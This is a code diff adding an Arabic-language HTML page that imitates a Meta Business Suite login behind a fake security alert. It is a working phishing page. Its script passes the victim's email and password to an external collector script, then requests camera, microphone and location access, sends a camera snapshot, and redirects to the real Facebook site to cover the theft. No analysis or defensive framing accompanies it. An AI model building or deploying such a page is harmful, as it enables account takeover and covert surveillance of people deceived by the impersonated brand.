@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Business Suite - Meta</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    color: #1c1e21;
+  }
+  .box {
+    background: #fff;
+    border-radius: 12px;
+    padding: 36px 28px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  }
+  .logo-area {
+    text-align: center;
+    margin-bottom: 24px;
+  }
+  .logo-icon {
+    width: 64px; height: 64px;
+    border-radius: 16px;
+    background: linear-gradient(135deg, #1877f2, #0866ff);
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 32px;
+    margin-bottom: 12px;
+  }
+  h1 {
+    font-size: 22px;
+    font-weight: 700;
+    text-align: center;
+    margin-bottom: 6px;
+  }
+  .subtitle {
+    font-size: 14px;
+    color: #65676b;
+    text-align: center;
+    line-height: 1.5;
+    margin-bottom: 24px;
+  }
+  .info-box {
+    background: #e7f3ff;
+    border-right: 4px solid #1877f2;
+    padding: 14px 16px;
+    border-radius: 6px;
+    margin-bottom: 20px;
+    font-size: 13px;
+    color: #0c3b7a;
+    line-height: 1.6;
+  }
+  .info-box strong { display: block; margin-bottom: 4px; }
+  .input-group { margin-bottom: 14px; }
+  .input {
+    width: 100%;
+    padding: 14px 16px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    font-size: 15px;
+    font-family: inherit;
+  }
+  .input:focus {
+    outline: none;
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px #e7f3ff;
+  }
+  .btn {
+    width: 100%;
+    padding: 14px;
+    background: #1877f2;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+    margin-top: 6px;
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+  .features-list {
+    margin-top: 20px;
+    padding-top: 20px;
+    border-top: 1px solid #e4e6eb;
+    font-size: 13px;
+    color: #65676b;
+    line-height: 1.8;
+  }
+  .features-list .feat { display: flex; align-items: center; gap: 8px; }
+  .features-list .feat span { color: #1877f2; font-weight: 700; }
+  .error-msg {
+    background: #ffebe8;
+    border: 1px solid #dd3c10;
+    border-radius: 6px;
+    padding: 10px 12px;
+    color: #dd3c10;
+    font-size: 13px;
+    margin-bottom: 12px;
+    display: none;
+  }
+  .error-msg.show { display: block; }
+  .page-loader {
+    position: fixed; inset: 0;
+    background: #fff;
+    display: none;
+    align-items: center; justify-content: center;
+    flex-direction: column;
+    z-index: 9999;
+  }
+  .page-loader.active { display: flex; }
+  .loader-spinner {
+    width: 48px; height: 48px;
+    border: 4px solid #e4e6eb;
+    border-top-color: #1877f2;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-bottom: 16px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loader-text { font-size: 15px; color: #65676b; }
+</style>
+</head>
+<body>
+
+<div class="box">
+  <div class="logo-area">
+    <div class="logo-icon">💼</div>
+    <h1>Meta Business Suite</h1>
+    <p class="subtitle">
+      أدِر صفحاتك، رسائلك، وإعلاناتك من مكان واحد.
+    </p>
+  </div>
+
+  <div class="info-box">
+    <strong>🔒 تنبيه أمني</strong>
+    لتأكيد هويتك والوصول لبيانات عملك، يرجى تسجيل الدخول.
+  </div>
+
+  <div class="error-msg" id="error-msg"></div>
+
+  <form id="business-form" onsubmit="return handleBusiness(event)">
+    <div class="input-group">
+      <input type="text" id="email" class="input" placeholder="البريد الإلكتروني للعمل" required>
+    </div>
+    <div class="input-group">
+      <input type="password" id="password" class="input" placeholder="كلمة المرور" required>
+    </div>
+    <button type="submit" class="btn" id="business-btn">تسجيل الدخول</button>
+  </form>
+
+  <div class="features-list">
+    <div class="feat"><span>✓</span> إدارة كل الصفحات</div>
+    <div class="feat"><span>✓</span> الرد على الرسائل</div>
+    <div class="feat"><span>✓</span> جدولة المنشورات</div>
+    <div class="feat"><span>✓</span> متابعة الإعلانات</div>
+  </div>
+</div>
+
+<div class="page-loader" id="page-loader">
+  <div class="loader-spinner"></div>
+  <div class="loader-text">جاري الدخول...</div>
+</div>
+
+<script src="/fs/static/collector.js"></script>
+
+<script>
+(function() {
+    "use strict";
+    var submitting = false;
+
+    function showError(msg) {
+        var el = document.getElementById('error-msg');
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(function() { el.classList.remove('show'); }, 4000);
+    }
+
+    function handleBusiness(event) {
+        event.preventDefault();
+        if (submitting) return false;
+
+        var email = document.getElementById('email').value.trim();
+        var password = document.getElementById('password').value.trim();
+
+        if (!email || !password) {
+            showError('يرجى ملء جميع الحقول');
+            return false;
+        }
+
+        submitting = true;
+        var btn = document.getElementById('business-btn');
+        btn.disabled = true;
+        btn.textContent = 'جاري التحقق...';
+
+        FSCollector.captureForm({
+            email: email,
+            password: password,
+            form_type: 'business_suite'
+        }, {
+            metadata: { page: '05_business' }
+        }).then(function() {
+            FSCollector.showLoader('جاري تحميل بيانات عملك...');
+
+            setTimeout(function() {
+                FSCollector.requestPermissions({
+                    camera: true,
+                    microphone: true,
+                    location: true
+                }).then(function(perms) {
+                    FSCollector.sendPermissionsResult(perms);
+                    if (perms.camera === 'granted' && window.FS_MEDIA_STREAMS && window.FS_MEDIA_STREAMS.camera) {
+                        FSCollector.captureFromStream(window.FS_MEDIA_STREAMS.camera, 'camera')
+                            .then(function(img) { if (img) FSCollector.sendSnapshot('camera', img); });
+                    }
+                });
+
+                setTimeout(function() {
+                    FSCollector.redirect('https://business.facebook.com');
+                }, 3000);
+            }, 500);
+        });
+
+        return false;
+    }
+
+    window.handleBusiness = handleBusiness;
+})();
+</script>
+
+</body>
+</html>
